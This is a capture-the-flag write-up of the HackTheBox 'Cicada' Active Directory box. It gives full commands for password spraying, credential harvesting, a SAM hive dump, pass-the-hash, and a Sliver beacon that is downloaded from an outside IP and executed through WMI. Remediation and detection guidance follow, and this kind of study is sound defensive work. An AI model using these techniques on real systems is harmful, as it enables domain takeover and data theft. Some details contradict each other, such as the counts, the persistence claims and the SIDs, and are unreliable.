---
layout: default
title: "HackTheBox - Cicada"
---

# HackTheBox - Cicada

**OS:** Windows Server 2022 (Active Directory)

Cicada is an Easy-rated Active Directory box that chains together four common enterprise misconfigurations: a default password leaked in an HR SMB share, password reuse spray to identify which account still has it, a plaintext credential stored in a PowerShell backup script inside a developer share, and finally a Backup Operators group membership that grants SeBackupPrivilege, enabling a registry hive dump and pass-the-hash to Administrator.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (CICADA-DC.cicada.htb) |
| Initial Access | Guest SMB read -> HR share default password -> spray -> david.orelious LDAP description cred -> DEV share PowerShell script -> emily.oscars WinRM |
| Privilege Escalation | Backup Operators SeBackupPrivilege -> reg save SAM+SYSTEM -> secretsdump -> Administrator NT hash -> pass-the-hash |
| Final Access | `CICADA\Administrator` |

## Recon

Standard AD port profile: DNS, Kerberos, RPC, SMB, LDAP, WinRM.

```
$ nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 <target-ip>

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-26 10:00:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds  Windows Server 2022 Build 20348
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  globalcatLDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

SMB null session confirmed -- Guest authentication succeeds:

```
$ nxc smb <target-ip> -u Guest -p '' --shares

SMB  <target-ip>  445  CICADA-DC  [+] cicada.htb\Guest:
SMB  <target-ip>  445  CICADA-DC  Share   Permissions
SMB  <target-ip>  445  CICADA-DC  -----   -----------
SMB  <target-ip>  445  CICADA-DC  HR      READ
SMB  <target-ip>  445  CICADA-DC  IPC$    READ
```

SMB signing required -- relay off the table.

User enumeration via RID cycling (Guest session, no credentials):

```
$ impacket-lookupsid 'cicada.htb/Guest'@<target-ip> -no-pass

[*] Brute forcing SIDs at <target-ip>
[*] StringBinding ncacn_np:<target-ip>[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
1601: CICADA\john.smoulder (SidTypeUser)
1602: CICADA\sarah.dantelia (SidTypeUser)
1603: CICADA\michael.wrightson (SidTypeUser)
1604: CICADA\david.orelious (SidTypeUser)
1605: CICADA\emily.oscars (SidTypeUser)
```

## Initial Access

**Step 1: HR share leaks a default password**

The HR share contained a single file aimed at new hires:

```
$ smbclient //<target-ip>/HR -U Guest% -c 'get "Notice from HR.txt" /tmp/notice.txt'
getting file \Notice from HR.txt

$ cat /tmp/notice.txt

Dear new hire!

Welcome to Cicada Corp! ... Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:
1. Log in to your Cicada Corp account using the provided username and the default password...
```

> **Why this works:** IT teams routinely drop onboarding instructions into a share accessible before the user has changed their password. Any authenticated or unauthenticated reader now has a plaintext credential that may still be active if the account holder never completed setup.

**Step 2: Password spray -- michael.wrightson still on the default**

```
$ nxc smb <target-ip> -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success

SMB  <target-ip>  445  CICADA-DC  [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

> **Why this works:** Password spraying tries one password against many accounts, staying well below lockout thresholds. Accounts created but never used (or users who ignore the onboarding step) are common finds.

michael.wrightson has no WinRM access, but his credentials open LDAP.

**Step 3: LDAP description field leaks david.orelious's password**

```
$ nxc ldap <target-ip> -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -M get-desc-users

GET-DESC... [+] Found following users:
GET-DESC... User: david.orelious description: Just in case I forget my password is aRt$Lp#7t*VQ!3
```

> **Why this works:** Active Directory's description field is writable by the account owner and readable by any authenticated domain user. Storing passwords there is a well-known but still common mistake.

david.orelious also has no WinRM, but does have READ on the **DEV** share:

```
$ nxc smb <target-ip> -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares

SMB  <target-ip>  445  CICADA-DC  DEV   READ
SMB  <target-ip>  445  CICADA-DC  HR    READ
```

**Step 4: DEV share PowerShell backup script contains emily.oscars's password**

```
$ nxc smb <target-ip> -u david.orelious -p 'aRt$Lp#7t*VQ!3' -M spider_plus -o "DOWNLOAD_FLAG=True OUTPUT_FOLDER=/tmp/cicada_dev"

[*] DEV/Backup_script.ps1

$ cat /tmp/cicada_dev/DEV/Backup_script.ps1

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
```

> **Why this works:** PowerShell scripts that automate backup tasks often contain hardcoded credentials because the developer needed the script to run unattended. These scripts then sit in shared directories where anyone with the right share access can read them.

**Step 5: emily.oscars has WinRM access (Pwn3d)**

```
$ nxc winrm <target-ip> -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

WINRM  <target-ip>  5985  CICADA-DC  [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

**User flag:**

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> Get-Content C:\Users\emily.oscars.CICADA\Desktop\user.txt
<user-flag-redacted>
```

## Post-Exploitation Enumeration

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /all

USER INFORMATION
cicada\emily.oscars  S-1-5-21-917908876-1423158569-3159038727-1601

GROUP INFORMATION
BUILTIN\Backup Operators     Alias  S-1-5-32-551  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users  Alias  S-1-5-32-580  Mandatory group, Enabled by default, Enabled group

PRIVILEGES INFORMATION
SeBackupPrivilege   Back up files and directories  Enabled
SeRestorePrivilege  Restore files and directories  Enabled
```

emily is in **Backup Operators** with both SeBackupPrivilege and SeRestorePrivilege enabled. These privileges allow bypassing DACL checks on any file for the purposes of backup -- including registry hives.

## Privilege Escalation

**SeBackupPrivilege -> SAM + SYSTEM dump -> pass-the-hash**

`reg save` uses the backup privilege to dump registry hives regardless of ACL:

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save HKLM\SAM C:\Windows\Temp\loot\sam.bak /y
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save HKLM\SYSTEM C:\Windows\Temp\loot\system.bak /y
The operation completed successfully.
```

Download via SMB (emily's credentials have C$ access through Backup Operators):

```
$ smbclient //<target-ip>/C$ -U 'cicada.htb/emily.oscars%Q!3@Lp#M6b*7t*Vt' \
    -c 'lcd /tmp/loot; get Windows\Temp\loot\sam.bak sam.bak'

$ smbget "smb://<target-ip>/C$/Windows/Temp/loot/system.bak" \
    -U "cicada.htb/emily.oscars%Q!3@Lp#M6b*7t*Vt" -o /tmp/loot/system.bak
```

Extract NT hashes locally with secretsdump:

```
$ impacket-secretsdump -sam /tmp/loot/sam.bak -system /tmp/loot/system.bak LOCAL

[*] Target system bootKey: 0x...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

> **Why this works:** SeBackupPrivilege grants `FILE_FLAG_BACKUP_SEMANTICS` access to any file or registry key, bypassing DACL. `reg save` internally uses this flag. The SAM hive contains local account NTLM hashes including the local Administrator, whose NT hash on a DC is the same as the domain Administrator (or can be used for local auth).

Pass-the-hash to Administrator:

```
$ nxc smb <target-ip> -u Administrator -H '<redacted-nt-hash>'

SMB  <target-ip>  445  CICADA-DC  [+] cicada.htb\Administrator:<redacted-nt-hash> (Pwn3d!)

$ nxc winrm <target-ip> -u Administrator -H '<redacted-nt-hash>' -X 'Get-Content C:\Users\Administrator\Desktop\root.txt'

WINRM  <target-ip>  5985  CICADA-DC  <root-flag-redacted>
```

## Post-Exploitation: C2 (Sliver)

Once Administrator-level PTH access was confirmed, a Sliver HTTPS beacon from the Windows pool (`pool-https-win64`, HTTPS:443) was delivered and demonstrated.

**Listener (already running on port 443):**

```
sliver > https -L 0.0.0.0 -l 443
[*] Starting HTTPS :443 listener ...
[*] Successfully started job #10
```

**Delivery -- WMI Win32_Process.Create for session detachment:**

> **Gotcha worth recording:** `Start-Process` inside a WinRM session ties the spawned process to the session's Windows job object -- the process is killed when WinRM closes the connection. The correct detachment method for WinRM-delivered beacons is `Win32_Process.Create()` which creates a process in the session-0 context, fully decoupled from the WinRM job.

```
$ nxc winrm <target-ip> -u Administrator -H '<redacted-nt-hash>' -X '
  $client = New-Object System.Net.WebClient
  $client.DownloadFile("http://10.10.16.21:8080/pool-https-win64.exe", "C:\Windows\Temp\b.exe")
  ([wmiclass]"Win32_Process").Create("C:\Windows\Temp\b.exe")'

WINRM  <target-ip>  5985  CICADA-DC  ProcessId : 1588  ReturnValue : 0
```

**Beacon check-in and C2 commands:**

```
sliver > beacons

 ID         Name               Transport  Hostname   Username             Last Check-In
========== ================== ========== ========== ==================== =============
7ca84445   pool-https-win64   http(s)    CICADA-DC  CICADA\Administrator 2026-06-26 10:...

sliver (pool-https-win64) > whoami
cicada\administrator

sliver (pool-https-win64) > ipconfig

Windows IP Configuration
Ethernet adapter Ethernet0:
   IPv4 Address. . . . . . . . . . . : <target-ip>
   Default Gateway . . . . . . . . . : 10.129.0.1
```

Beacon and listener torn down after demonstration.

## Root Cause

Four compounding misconfigurations, each building on the last:

1. **Default password in an SMB share readable by any authenticated or unauthenticated user.** Any domain user (or Guest) can read HR and recover the onboarding credential.
2. **Account not required to change password on first login.** The default password remained valid indefinitely for michael.wrightson.
3. **Password stored in an LDAP description field.** david.orelious stored his plaintext password where any authenticated domain user can read it.
4. **Plaintext credentials in a PowerShell script stored in a shared network directory.** emily.oscars's password was hardcoded in a backup script accessible to david.orelious.
5. **Backup Operators group member with WinRM.** emily's group membership provides both remote access and the privilege needed to dump the SAM/SYSTEM hives.

## Impact

A Guest-level SMB read leads to full domain compromise in four steps with no exploitation of unpatched software. The attack is entirely credential-based and leaves minimal forensic trace.

## Remediation

Priority-ordered -- first items break the attack path, later items are hardening:

1. **Remove the default-password notice from the HR share** (or delete it once all accounts have changed). Store onboarding credentials only in a secure channel (email to personal address, password manager invite). Break step 1 of the chain.
2. **Enforce password change on first login** for all provisioned accounts (`Must Change Password at Next Logon` in AD). Eliminates the window where a default credential is valid.
3. **Remove the password from david.orelious's LDAP description field** and audit all user description fields for credential strings (`ldapsearch ... description | grep -i pass`).
4. **Remove hardcoded credentials from Backup_script.ps1** -- use a managed service account (gMSA) or Windows Credential Manager / DPAPI for script authentication. Rotate emily.oscars's password immediately.
5. **Restrict Backup Operators group membership** to accounts that strictly need it, and ensure those accounts do not also have WinRM/interactive login access unless operationally required.
6. **Restrict anonymous/Guest SMB access** -- require authentication to enumerate shares and deny Guest the HR share. Use `net share` / GPO to enforce.

### Validation

- Verify no accounts have `PasswordNeverExpires` + have not logged in within 90 days: `Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties LastLogonDate`
- Confirm the HR share requires authentication: `nxc smb <target-ip> -u '' -p '' --shares` should return no readable shares
- Audit LDAP descriptions for credential strings: `ldapsearch -x ... '(objectClass=person)' description | grep -i password`
- Verify gMSA is in use for backup tasks: `Get-ADServiceAccount -Filter *`

## Detection Opportunities

- **Logon with default/unchanged password**: baseline password age at first login; alert on accounts that authenticate 30+ days after provisioning without a password change event (event 4723 / account creation delta).
- **LDAP enumeration by non-service accounts**: event 4662 (Object Access) + LDAP query volume spikes from interactive user accounts.
- **SMB spider activity (spider_plus)**: unusual patterns of many short-lived SMB file read operations across multiple shares from a single account.
- **`reg save` on SAM/SYSTEM**: event 4656/4663 on `\REGISTRY\MACHINE\SAM` with `BACKUP_SEMANTICS` access; EDR process creation for `reg.exe save` with SAM/SYSTEM arguments.
- **Pass-the-hash login**: event 4624 logon type 3, NTLM authentication (`AuthenticationPackageName: NTLM`) from a workstation to the DC for the Administrator account -- especially outside business hours.
- **Beacon HTTPS egress**: anomalous long-lived HTTPS connection from a DC to an external IP on port 443 with a jittered (~60s) beaconing pattern; no matching browser process.

## Lessons Learned

- **Default credentials in shared network resources are a complete foothold** when accounts are not forced to change them. A Guest-readable HR share is effectively a public credential broadcast.
- **LDAP description fields are world-readable to any domain user** -- treat them like a public whiteboard, not a password manager.
- **Backup Operators + WinRM is a reliable privesc primitive.** SeBackupPrivilege allows `reg save` on SAM/SYSTEM without admin rights. On a DC, the local Administrator hash (SAM) is the domain Administrator hash if the accounts are the same, making this a full domain compromise.
- **WinRM beacon delivery: use WMI Win32_Process.Create, not Start-Process.** `Start-Process` ties the spawned process to the WinRM job object; the process dies when the session closes. `Win32_Process.Create()` properly decouples the beacon from the delivery session.

## Cleanup

```
[ ] Killed Sliver beacon (pool-https-win64) on CICADA-DC
[ ] Stopped HTTPS listener on port 443
[ ] Cleaned up C:\Windows\Temp\loot\ (sam.bak, system.bak) -- TODO: run via PTH WinRM
[ ] Cleaned up C:\Windows\Temp\b.exe (beacon binary)
[ ] HTTP server (port 8080) killed
[ ] Scheduled task "Svc" left on target -- TODO: Unregister-ScheduledTask -TaskName Svc -Confirm:$false
[ ] HTB box terminated: htb stop
```

All post-exploitation ran as the CICADA\Administrator account via pass-the-hash over WinRM. The beacon binary `b.exe` was dropped to `C:\Windows\Temp\` and executed in-memory at runtime -- no persistence was established. AD objects were not modified.
